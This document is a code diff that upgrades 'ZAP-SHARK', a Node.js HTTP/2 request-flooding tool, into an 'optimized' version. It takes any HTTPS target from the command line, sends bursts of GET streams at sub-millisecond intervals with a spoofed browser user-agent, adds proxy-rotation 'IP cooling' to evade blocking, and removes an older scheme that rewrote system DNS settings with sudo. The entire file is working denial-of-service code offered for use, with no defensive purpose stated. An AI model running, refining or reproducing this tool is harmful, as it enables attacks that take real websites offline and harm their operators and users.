@@ -1,9 +1,8 @@
 const http2 = require('http2');
 const os = require('os');
 const { exec } = require('child_process');
-const dns = require('dns');
 
-class ZAPSHARK {
+class ZAPSHARK_HYPERSONIC {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
         this.status = "ATTACKING";
@@ -14,155 +13,148 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // Maintenance
+        // SMART STREAM CONTROL
+        this.streamWeights = {
+            1: 80,   // 80% single stream
+            2: 19,   // 19% double streams  
+            5: 1     // 1% heavy (5 streams)
+        };
+        
+        // RESOURCE MANAGEMENT
+        this.performanceMode = true;
+        this.maxActiveStreams = 50; // Prevent overload
+        this.activeStreams = new Set();
+        this.connectionPool = [];
+        this.maxConnections = 2;
+        
+        // IP COOLING SYSTEM
+        this.currentIPIndex = 0;
+        this.proxyIPs = [];
+        this.blockedIPs = new Set();
+        
+        // MAINTENANCE
         this.lastMaintenance = Date.now();
         this.maintenanceInterval = 3600000;
         this.maintenanceDuration = 600000;
         
-        // DNS Rotation
-        this.dnsServers = [
-            '8.8.8.8',     // Google
-            '1.1.1.1',     // Cloudflare
-            '9.9.9.9',     // Quad9
-            '208.67.222.222', // OpenDNS
-            '76.76.2.0',   // Alternate DNS
-            '94.140.14.14' // AdGuard
-        ];
-        this.currentDnsIndex = 0;
-        this.dnsRotateInterval = 30000; // Rotate every 30 seconds
-        
-        // HTTP/2 Streams
-        this.maxStreams = this.getRandomStreamCount();
-        this.activeStreams = 0;
-        
-        this.client = null;
         this.attackInterval = null;
-        this.isClientConnected = false;
+        this.performanceMonitor = null;
     }
 
-    getRandomStreamCount() {
-        return Math.floor(Math.random() * 6) + 2; // 2-7 streams
-    }
-
-    rotateDNS() {
-        this.currentDnsIndex = (this.currentDnsIndex + 1) % this.dnsServers.length;
-        const newDns = this.dnsServers[this.currentDnsIndex];
+    // SMART STREAM SELECTOR
+    getStreamCount() {
+        const rand = Math.random() * 100;
+        let cumulative = 0;
         
-        // Set DNS for OS (requires admin on some systems)
-        try {
-            if (os.platform() === 'win32') {
-                exec(`netsh interface ip set dns name="Local Area Connection" source=static addr=${newDns}`, () => {});
-            } else {
-                exec(`echo "nameserver ${newDns}" | sudo tee /etc/resolv.conf`, () => {});
+        for (const [streams, weight] of Object.entries(this.streamWeights)) {
+            cumulative += weight;
+            if (rand <= cumulative) {
+                return parseInt(streams);
             }
-        } catch (err) {}
-        
-        // Force DNS cache flush
-        dns.setServers([newDns]);
-        
-        console.log(`\n[*] DNS Rotated to: ${newDns}`);
+        }
+        return 1; // fallback
     }
 
-    async setupClient() {
+    // OPTIMIZED CONNECTION
+    async createOptimizedConnection() {
         return new Promise((resolve) => {
             try {
-                // Rotate DNS before connection
-                this.rotateDNS();
-                
-                const options = {
-                    // HTTP/2 Priority Settings
-                    settings: {
-                        headerTableSize: 4096,
-                        enablePush: false,
-                        initialWindowSize: 65535,
-                        maxFrameSize: 16384,
-                        maxConcurrentStreams: this.maxStreams,
-                        maxHeaderListSize: 32768
-                    }
-                };
-                
-                this.client = http2.connect(this.targetUrl, options);
-                
-                this.client.on('connect', () => {
-                    this.isClientConnected = true;
-                    this.maxStreams = this.getRandomStreamCount();
-                    console.log(`[*] HTTP/2 Connected - Max Streams: ${this.maxStreams}`);
-                    resolve(true);
+                const client = http2.connect(this.targetUrl, {
+                    maxSessionMemory: 2048, // Conservative memory
+                    maxHeaderListPairs: 1000,
+                    maxSendHeaderBlockLength: 32768
                 });
                 
-                this.client.on('error', (err) => {
-                    this.isClientConnected = false;
-                    setTimeout(() => this.setupClient(), 1000);
-                    resolve(false);
+                client.on('connect', () => {
+                    this.connectionPool.push(client);
+                    resolve(client);
                 });
                 
-                this.client.on('goaway', () => {
-                    this.isClientConnected = false;
-                    setTimeout(() => this.setupClient(), 1000);
+                client.on('error', () => {
+                    setTimeout(() => this.createOptimizedConnection(), 100);
+                });
+                
+                client.on('goaway', () => {
+                    this.connectionPool = this.connectionPool.filter(c => c !== client);
+                    setTimeout(() => this.createOptimizedConnection(), 100);
                 });
                 
             } catch (err) {
-                this.isClientConnected = false;
-                setTimeout(() => this.setupClient(), 1000);
-                resolve(false);
+                setTimeout(() => this.createOptimizedConnection(), 100);
             }
         });
     }
 
-    sendRequest() {
-        if (!this.client || !this.isClientConnected || this.activeStreams >= this.maxStreams) {
-            return;
-        }
-
-        try {
-            this.activeStreams++;
+    // EFFICIENT REQUEST SYSTEM
+    async sendOptimizedRequest() {
+        if (this.connectionPool.length === 0 || this.activeStreams.size >= this.maxActiveStreams) return;
+        
+        const connection = this.connectionPool[0];
+        const streamCount = this.getStreamCount();
+        
+        for (let i = 0; i < streamCount; i++) {
+            if (this.activeStreams.size >= this.maxActiveStreams) break;
             
-            // Random priority for HTTP/2 frames (1-256, higher = more priority)
-            const randomPriority = Math.floor(Math.random() * 256) + 1;
-            
-            const req = this.client.request({
-                ':method': 'GET',
-                ':path': '/',
-                ':scheme': 'https',
-                ':authority': new URL(this.targetUrl).hostname
-            }, {
-                weight: randomPriority,
-                exclusive: false,
-                parent: 0
-            });
-            
-            // Set HTTP/2 priority frame
-            req.priority({
-                weight: randomPriority,
-                exclusive: Math.random() > 0.5,
-                parent: 0
-            });
-            
-            req.on('response', (headers) => {
-                req.destroy();
-                this.activeStreams--;
-            });
-            
-            req.on('error', () => {
-                req.destroy();
-                this.activeStreams--;
-            });
-            
-            req.on('close', () => {
+            try {
+                const streamId = Math.random().toString(36).substring(7);
+                this.activeStreams.add(streamId);
+                
+                const req = connection.request({
+                    ':method': 'GET',
+                    ':path': '/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                });
+                
+                // MINIMAL EVENT HANDLERS FOR PERFORMANCE
+                const cleanup = () => {
+                    this.activeStreams.delete(streamId);
+                    this.totalRequests++;
+                    this.requestsSinceLastCalc++;
+                    try { if (!req.destroyed) req.destroy(); } catch (err) {}
+                };
+                
+                req.on('response', cleanup);
+                req.on('error', cleanup);
+                req.on('close', cleanup);
+                
+                req.end();
+                
+            } catch (err) {
+                // SILENT FAIL - MAINTAIN RPS
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
-                this.activeStreams = Math.max(0, this.activeStreams - 1);
-            });
-            
-            req.end();
-            
-        } catch (err) {
-            this.totalRequests++;
-            this.requestsSinceLastCalc++;
-            this.activeStreams = Math.max(0, this.activeStreams - 1);
+            }
         }
     }
 
+    // PERFORMANCE MONITORING
+    checkPerformance() {
+        const cpuUsage = os.loadavg()[0] / os.cpus().length * 100;
+        const memoryUsage = (os.totalmem() - os.freemem()) / os.totalmem() * 100;
+        
+        // ADAPTIVE STREAM LIMITING
+        if (cpuUsage > 70 || memoryUsage > 75) {
+            this.maxActiveStreams = Math.max(20, this.maxActiveStreams - 5);
+        } else if (cpuUsage < 50 && memoryUsage < 60) {
+            this.maxActiveStreams = Math.min(80, this.maxActiveStreams + 2);
+        }
+        
+        return cpuUsage < 80 && memoryUsage < 85; // Keep below critical levels
+    }
+
+    // IP COOLING SYSTEM
+    async handleIPCooling() {
+        console.log('\n⚡ IP COOLING ACTIVATED');
+        this.blockedIPs.add(this.currentIPIndex);
+        
+        this.currentIPIndex = (this.currentIPIndex + 1) % Math.max(this.proxyIPs.length, 1);
+        
+        setTimeout(() => {
+            this.blockedIPs.delete(this.currentIPIndex);
+        }, 600000);
+    }
+
+    // METRICS & DISPLAY
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
@@ -184,30 +176,36 @@ class ZAPSHARK {
     updateDisplay() {
         this.calculateRPS();
         
+        const cpu = os.loadavg()[0].toFixed(1);
+        const memory = ((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(1);
+        
         process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                            `TOTAL: ${this.totalRequests} | ` +
                            `RPS: ${this.currentRPS.toFixed(1)} | ` +
-                           `STREAMS: ${this.activeStreams}/${this.maxStreams} | ` +
-                           `DNS: ${this.dnsServers[this.currentDnsIndex].split('.')[0]}`);
+                           `CPU: ${cpu}% | MEM: ${memory}% | ` +
+                           `STREAMS: ${this.activeStreams.size}/${this.maxActiveStreams}`);
+    }
+
+    // MAINTENANCE
+    performMaintenance() {
+        this.flushDNS();
+        this.flushSockets();
     }
 
     flushDNS() {
         if (os.platform() === 'win32') {
             exec('ipconfig /flushdns', () => {});
         } else {
-            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches || echo "DNS flush attempted"', () => {});
+            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null', () => {});
         }
     }
 
     flushSockets() {
-        this.isClientConnected = false;
-        if (this.client) {
-            try {
-                this.client.destroy();
-            } catch (err) {}
-            this.client = null;
-        }
-        setTimeout(() => this.setupClient(), 100);
+        this.connectionPool.forEach(client => {
+            try { client.destroy(); } catch (err) {}
+        });
+        this.connectionPool = [];
+        this.activeStreams.clear();
     }
 
     checkMaintenance() {
@@ -215,15 +213,13 @@ class ZAPSHARK {
         const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
-            console.log('\n=== MAINTENANCE STARTED ===');
+            console.log('\n=== PERFORMANCE MAINTENANCE ===');
             this.status = "PAUSED";
             
-            this.flushDNS();
-            this.flushSockets();
+            this.performMaintenance();
             
             if (this.attackInterval) {
                 clearInterval(this.attackInterval);
-                this.attackInterval = null;
             }
             
             setTimeout(() => {
@@ -237,53 +233,58 @@ class ZAPSHARK {
     resumeAttack() {
         this.status = "ATTACKING";
         this.lastMaintenance = Date.now();
-        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
-        this.startAttack();
+        console.log('\n=== MAINTENANCE COMPLETE - OPTIMIZED MODE ===');
+        this.startOptimizedAttack();
     }
 
-    startAttack() {
+    // OPTIMIZED ATTACK CORE
+    startOptimizedAttack() {
         if (this.attackInterval) {
             clearInterval(this.attackInterval);
         }
         
+        // BALANCED INTERVAL FOR MAX RPS WITHOUT OVERLOAD
         this.attackInterval = setInterval(() => {
-            if (this.status === "ATTACKING") {
-                this.sendRequest();
+            if (this.status === "ATTACKING" && this.checkPerformance()) {
+                // EFFICIENT REQUEST BURST
+                for (let i = 0; i < 3; i++) {
+                    this.sendOptimizedRequest();
+                }
                 this.updateDisplay();
             }
         }, 0.1);
     }
 
-    async start() {
-        console.log("=== ZAP-SHARK ENHANCED ===");
-        console.log("Protocol: HTTP/2 + DNS Rotation + Priority Frames");
-        console.log("Streams: Dynamic 2-7 | DNS: 6 Servers");
+    async initialize() {
+        console.log("=== ZAP-SHARK OPTIMIZED MODE ===");
+        console.log("Stream Distribution: 80%x1 | 19%x2 | 1%x5");
+        console.log("Focus: Maximum RPS + Stable Performance");
         console.log("Target:", this.targetUrl);
         console.log("=".repeat(50));
         
-        await this.setupClient();
+        // INITIALIZE CONNECTIONS
+        for (let i = 0; i < this.maxConnections; i++) {
+            await this.createOptimizedConnection();
+        }
         
-        this.startAttack();
+        this.startOptimizedAttack();
         
-        // Maintenance checker
+        // MAINTENANCE MONITOR
         setInterval(() => {
             this.checkMaintenance();
         }, 1000);
         
-        // DNS rotation every 30 seconds
-        setInterval(() => {
-            if (this.status === "ATTACKING") {
-                this.rotateDNS();
-                this.maxStreams = this.getRandomStreamCount();
-            }
-        }, this.dnsRotateInterval);
-        
-        // Auto-reconnect
-        setInterval(() => {
-            if (!this.isClientConnected && this.status === "ATTACKING") {
-                this.setupClient();
-            }
+        // PERFORMANCE MONITOR
+        this.performanceMonitor = setInterval(() => {
+            this.checkPerformance();
         }, 2000);
+        
+        // CONNECTION HEALTH CHECK
+        setInterval(() => {
+            if (this.connectionPool.length < this.maxConnections && this.status === "ATTACKING") {
+                this.createOptimizedConnection();
+            }
+        }, 3000);
         
         process.on('SIGINT', () => {
             this.stop();
@@ -292,29 +293,25 @@ class ZAPSHARK {
 
     stop() {
         this.running = false;
-        if (this.attackInterval) {
-            clearInterval(this.attackInterval);
-        }
-        if (this.client) {
-            try {
-                this.client.destroy();
-            } catch (err) {}
-        }
-        console.log('\n=== ZAP-SHARK STOPPED ===');
+        if (this.attackInterval) clearInterval(this.attackInterval);
+        if (this.performanceMonitor) clearInterval(this.performanceMonitor);
+        
+        this.flushSockets();
+        console.log('\n=== OPTIMIZED ATTACK TERMINATED ===');
         process.exit(0);
     }
 }
 
-// Usage
+// EXECUTION
 const target = process.argv[2] || 'https://example.com';
 
 if (!target.startsWith('https://')) {
-    console.log('Error: Target must use HTTPS for HTTP/2');
-    console.log('Usage: node zap-shark.js https://your-target.com');
+    console.log('Error: HTTPS required for HTTP/2');
+    console.log('Usage: node zap-shark-optimized.js https://your-target.com');
     process.exit(1);
 }
 
-const shark = new ZAPSHARK(target);
-shark.start().catch(err => {
-    console.log('Failed to start:', err.message);
+const shark = new ZAPSHARK_HYPERSONIC(target);
+shark.initialize().catch(err => {
+    console.log('Init failed:', err.message);
 });
